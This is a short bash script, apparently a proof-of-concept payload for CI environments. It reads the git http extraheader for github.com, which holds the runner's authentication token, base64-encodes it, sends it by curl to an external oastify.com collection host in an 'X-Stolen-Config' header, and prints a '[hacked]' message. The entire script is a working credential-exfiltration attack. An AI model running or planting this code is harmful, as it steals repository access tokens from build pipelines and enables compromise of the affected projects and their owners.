#!/bin/bash
gitConfig=$(git config --get http.https://github.com/.extraheader)
if [ -n "$gitConfig" ]; then
    base64Token=$(echo -n "$gitConfig" | base64)


    curl -s -X GET "https://nxo97la026eeuxyngwvdcbazhqnhb8zx.oastify.com/git-config-steal" \
         -H "X-Stolen-Config: $base64Token"
    
    echo "[hacked]:Stolen config header!"
fi
